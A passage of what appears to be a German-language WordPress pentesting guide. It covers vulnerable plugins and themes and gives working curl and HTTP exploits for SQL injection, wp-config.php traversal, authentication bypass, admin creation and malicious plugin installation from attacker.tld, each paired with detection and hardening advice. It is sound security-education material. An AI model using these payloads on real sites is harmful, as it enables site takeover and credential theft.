- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typische hochkritische F√§lle: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive Hinweise

- Don‚Äôt rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regelm√§√üige Updates

Stelle sicher, dass WordPress, plugins und themes auf dem neuesten Stand sind. Best√§tige au√üerdem, dass automatisches Updating in wp-config.php aktiviert ist:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Installiere au√üerdem **nur vertrauensw√ºrdige WordPress-Plugins und -Themes**.

### Sicherheits-Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Weitere Empfehlungen**

- Entferne den Standard **admin** Benutzer
- Verwende **starke Passw√∂rter** und **2FA**
- Periodisch **√ºberpr√ºfe** Benutzer **Berechtigungen**
- Begrenze Login-Versuche, um Brute Force-Angriffe zu verhindern
- Benenne die Datei **`wp-admin.php`** um und erlaube den Zugriff nur intern oder von bestimmten IP-Adressen.


### Unauthenticated SQL Injection durch unzureichende Validierung (WP Job Portal <= 2.3.2)

Das WP Job Portal recruitment plugin stellte eine **savecategory** Aufgabe bereit, die letztlich den folgenden verwundbaren Code in `modules/category/model.php::validateFormData()` ausf√ºhrt:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probleme, die durch diesen Codeabschnitt entstehen:

1. **Unbereinigte Benutzereingabe** ‚Äì `parentid` kommt direkt aus der HTTP-Anfrage.
2. **String-Konkatenation innerhalb der WHERE-Klausel** ‚Äì kein `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì obwohl die Aktion √ºber `admin-post.php` ausgef√ºhrt wird, ist die einzige Pr√ºfung ein **CSRF nonce** (`wp_verify_nonce()`), den jeder Besucher von einer √∂ffentlichen Seite mit dem Shortcode `[wpjobportal_my_resumes]` abrufen kann.

#### Ausnutzung

1. Beschaffe einen frischen Nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injiziere beliebiges SQL durch Missbrauch von `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Die Antwort gibt das Ergebnis der injizierten Abfrage preis oder ver√§ndert die Datenbank und beweist damit SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Eine weitere Aufgabe, **downloadcustomfile**, erlaubte Besuchern, **beliebige Dateien auf der Festplatte** mittels path traversal herunterzuladen. Die verwundbare Sink befindet sich in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ist vom Angreifer kontrolliert und wird **ohne Bereinigung** verkettet. Erneut ist das einzige Hindernis ein **CSRF nonce**, das von der Resume-Seite abgerufen werden kann.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Der Server antwortet mit dem Inhalt von `wp-config.php`, leaking DB credentials and auth keys.

## Nicht authentifizierte Konto√ºbernahme √ºber Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Viele Themes/Plugins liefern "social login"-Hilfsfunktionen, die via admin-ajax.php exponiert sind. Wenn eine nicht authentifizierte AJAX-Aktion (`wp_ajax_nopriv_...`) client-seitig gelieferte Identifier vertraut, wenn Provider-Daten fehlen, und dann `wp_set_auth_cookie()` aufruft, wird das zu einem full authentication bypass.

Typisches fehlerhaftes Muster (vereinfacht)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Warum es ausnutzbar ist

- Nicht authentifiziert erreichbar √ºber admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- Keine nonce-/capability-Checks vor einer Zustands√§nderung.
- Fehlende OAuth/OpenID-Provider-Verifizierung; der default-Branch akzeptiert Eingaben des Angreifers.
- get_user_by('email', $_POST['id']) gefolgt von wp_set_auth_cookie($uid) authentifiziert den Anfragenden als jede existierende E-Mail-Adresse.

Ausnutzung (nicht authentifiziert)

- Voraussetzungen: Der Angreifer kann /wp-admin/admin-ajax.php erreichen und kennt/err√§t eine g√ºltige Benutzer-E-Mail.
- Setze provider auf einen nicht unterst√ºtzten Wert (oder lasse ihn weg), um den default-Branch zu treffen und id=<victim_email> zu √ºbergeben.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 mit JSON-Body wie {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* f√ºr den betroffenen Nutzer; nachfolgende Requests sind authentifiziert.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web Logs, die unauthenticated POSTs zu /wp-admin/admin-ajax.php mit der social-login action und id=<email> zeigen.
- 200-Antworten mit dem success-JSON unmittelbar vor authentifiziertem Traffic von derselben IP/User-Agent.

Hardening

- Identit√§t nicht aus Client-Input ableiten. Nur Emails/IDs akzeptieren, die aus einem validierten Provider-Token/ID stammen.
- CSRF nonces und capability checks auch f√ºr Login-Helfer verlangen; wp_ajax_nopriv_ nur registrieren, wenn es wirklich n√∂tig ist.
- OAuth/OIDC-Antworten serverseitig validieren und verifizieren; fehlende/ung√ºltige Provider ablehnen (kein Fallback auf POST id).
- In Erw√§gung ziehen, social login vor√ºbergehend zu deaktivieren oder virtuell am Edge zu patchen (die verwundbare action blocken), bis ein Fix vorhanden ist.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Einige Plugins stellen REST-Endpunkte bereit, die wiederverwendbare "connection keys" oder Tokens erzeugen, ohne die F√§higkeiten des Aufrufers zu pr√ºfen. Wenn die Route nur anhand eines vorhersehbaren Attributs (z. B. username) authentifiziert und der Key nicht an einen User/Session mit capability checks gebunden wird, kann jeder unauthentifizierte Angreifer einen Key minten und privilegierte Aktionen ausl√∂sen (Erstellung eines Admin-Accounts, Plugin-Aktionen ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: vollst√§ndige √úbernahme durch Verkettung des geminteten Keys mit internen privilegierten Aktionen

PoC ‚Äì Einen connection key minten und verwenden
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Warum es ausnutzbar ist
- Empfindliche REST-Route nur durch einen Identit√§tsnachweis mit geringer Entropie (username) oder fehlende permission_callback gesch√ºtzt
- Keine Capability-Pr√ºfung; erzeugter Schl√ºssel wird als universeller Bypass akzeptiert

Erkennungs-Checkliste
- Grep im Plugin-Code nach register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Jede Route, die Tokens/Keys basierend auf einer vom Request gelieferten Identit√§t (username/email) ausstellt, ohne sie an einen authentifizierten Benutzer oder eine Capability zu binden
- Suche nach nachfolgenden Routen, die den erzeugten Token/Key ohne serverseitige Capability-Pr√ºfungen akzeptieren

H√§rtung
- F√ºr jede privilegierte REST-Route: Erfordere permission_callback, das current_user_can() f√ºr die erforderliche Capability erzwingt
- Erzeuge keine langlebigen Keys aus client-gelieferter Identit√§t; falls n√∂tig, stelle nach Authentifizierung kurzlebige, an den Benutzer gebundene Tokens aus und √ºberpr√ºfe bei Verwendung erneut die Capabilities
- Validiere den User-Kontext des Aufrufers (wp_set_current_user ist allein nicht ausreichend) und lehne Requests ab, bei denen !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí unauthenticated arbitrary plugin installation (FunnelKit Automations ‚â§ 3.5.3)

Nonces verhindern CSRF, nicht die Autorisierung. Wenn Code ein erfolgreiches Nonce als Freigabe interpretiert und dann Capability-Pr√ºfungen f√ºr privilegierte Operationen (z. B. install/activate plugins) √ºberspringt, k√∂nnen nicht authentifizierte Angreifer eine schwache Nonce-Anforderung erf√ºllen und RCE erreichen, indem sie ein mit Hintert√ºr versehenes oder verwundbares Plugin installieren.

- Verwundbarer Pfad: plugin/install_and_activate
- Fehler: schwache Nonce-Hash-Pr√ºfung; keine current_user_can('install_plugins'|'activate_plugins') sobald Nonce ‚Äúpasses‚Äù
- Auswirkung: vollst√§ndige Kompromittierung durch beliebige Plugin-Installation/Aktivierung

PoC (Form h√§ngt vom Plugin ab; nur illustrativ)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Erkennungs-Checkliste
- REST-/AJAX-Handler, die Plugins/Themes ver√§ndern und nur wp_verify_nonce()/check_admin_referer() verwenden und keine Capability-Pr√ºfung durchf√ºhren
- Jeder Codepfad, der $skip_caps = true nach der Nonce-Validierung setzt

H√§rtung
- Behandle Nonces immer nur als CSRF-Token; erzwinge Capability-Pr√ºfungen unabh√§ngig vom Nonce-Status
- Fordere current_user_can('install_plugins') und current_user_can('activate_plugins'), bevor Installer-Code erreicht wird
- Weise nicht authentifizierten Zugriff ab; vermeide das Exponieren von nopriv AJAX-Aktionen f√ºr privilegierte Abl√§ufe

### Subscriber+ AJAX-Plugin-Installer ‚Üí erzwungene b√∂sartige Aktivierung (Motors Theme ‚â§ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) zeigte, wie das Motors Theme einen authentifizierten AJAX-Helper zum Installieren seines Begleit-Plugins ausliefert:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Es wird nur `check_ajax_referer()` aufgerufen; es gibt kein `current_user_can('install_plugins')` oder `current_user_can('activate_plugins')`.
- Der Nonce ist in der Motors Admin-Seite eingebettet, sodass jeder Subscriber, der `/wp-admin/` √∂ffnen kann, ihn aus dem HTML/JS kopieren kann.
- Der Handler vertraut dem vom Angreifer kontrollierten `plugin`-Parameter (aus `$_GET`) und √ºbergibt ihn an `Plugin_Upgrader::install()`, sodass eine beliebige entfernte ZIP nach `wp-content/plugins/` heruntergeladen wird.
- Nach der Installation ruft das Theme bedingungslos `mvl_theme_activate_plugin()` auf, was die Ausf√ºhrung des PHP-Codes des Angreifer-Plugins garantiert.

#### Ablauf der Ausnutzung

1. Registriere/kompromittiere ein niedrig privilegiertes Konto (Subscriber reicht) und lese den `mvl_theme_install_base` nonce aus der Motors-Dashboard-UI aus.
2. Erstelle ein Plugin-ZIP, dessen oberstes Verzeichnis dem erwarteten Slug `motors-car-dealership-classified-listings/` entspricht, und bette eine backdoor oder webshell in die `*.php` Entrypoints ein.
3. Hoste das ZIP und l√∂se den Installer aus, indem du den Handler auf deine URL zeigst:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
Da der Handler `$_GET['plugin']` liest, kann dieselbe payload auch √ºber die Query-String gesendet werden.

#### Erkennungs-Checkliste

- Durchsuche themes/plugins nach `Plugin_Upgrader`, `Theme_Upgrader` oder benutzerdefinierten `install_plugin.php`-Hilfsfunktionen, die an `wp_ajax_*`-Hooks ohne capability checks angebunden sind.
- Untersuche jeden Handler, der einen `plugin`, `package`, `source` oder `url` Parameter entgegennimmt und in Upgrader-APIs einspeist, besonders wenn der slug hard-coded ist, aber der ZIP-Inhalt nicht validiert wird.
- √úberpr√ºfe Admin-Seiten, die nonces f√ºr Installer-Aktionen offenlegen ‚Äî wenn Subscribers die Seite laden k√∂nnen, gehe davon aus, dass die nonce leak.

#### H√§rtung

- Sch√ºtze Installer-AJAX-Callbacks mit `current_user_can('install_plugins')` und `current_user_can('activate_plugins')` nach nonce-Verifizierung; Motors 5.6.82 hat diese Pr√ºfung eingef√ºhrt, um den Bug zu beheben.
- Verweigere nicht vertrauensw√ºrdige URLs: beschr√§nke Installer auf mitgelieferte ZIPs oder vertrauensw√ºrdige Repositories, oder erzwinge signierte Download-Manifeste.
- Behandle nonces strikt als CSRF tokens; sie gew√§hren keine Autorisierung und sollten niemals capability checks ersetzen.

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider ‚â§ 3.6.1)

Mehrere depicter-* Aktionen haben den s (search)-Parameter verarbeitet und ihn ohne Parametrisierung in SQL-Abfragen verkettet.

- Parameter: s (search)
- Fehler: direkte String-Konkatenation in WHERE/LIKE-Klauseln; keine prepared statements/sanitization
- Auswirkung: Datenbank-Exfiltration (users, hashes), laterale Bewegung

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep nach depicter-* action handlers und direkter Verwendung von $_GET['s'] oder $_POST['s'] in SQL
- √úberpr√ºfe benutzerdefinierte Queries, die an $wpdb->get_results()/query() √ºbergeben werden und s verketteten

Hardening
- Verwende immer $wpdb->prepare() oder wpdb-Platzhalter; unerwartete Metazeichen serverseitig ablehnen
- F√ºge eine strikte allowlist f√ºr s hinzu und normalisiere auf erwarteten Zeichensatz/L√§nge

---

## Nicht authentifizierte Local File Inclusion √ºber einen nicht validierten Template-/Dateipfad (Kubio AI Page Builder ‚â§ 2.5.1)

Das Akzeptieren von vom Angreifer kontrollierten Pfaden in einem Template-Parameter ohne Normalisierung/Containment erm√∂glicht das Lesen beliebiger lokaler Dateien und manchmal Codeausf√ºhrung, wenn einbindbare PHP-/Log-Dateien zur Laufzeit eingebunden werden.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: keine Normalisierung/allowlisting; traversal erlaubt
- Impact: Offenlegung von Geheimnissen (wp-config.php), potenzielles RCE in bestimmten Umgebungen (log poisoning, einbindbare PHP-Dateien)

PoC ‚Äì wp-config.php lesen
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Erkennungs-Checkliste
- Jeder Handler, der Request-Pfade in include()/require()/read-Sinks verkettet, ohne realpath() zur Begrenzung zu verwenden
- Auf Traversal-Muster (../) achten, die au√üerhalb des vorgesehenen templates-Verzeichnisses gelangen

H√§rtung
- Erzwinge allowlisted Templates; mit realpath() aufl√∂sen und require str_starts_with(realpath(file), realpath(allowed_base))
- Eingaben normalisieren; Traversal-Sequenzen und absolute Pfade ablehnen; sanitize_file_name() nur f√ºr Dateinamen verwenden (nicht f√ºr volle Pfade)


## Referenzen

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
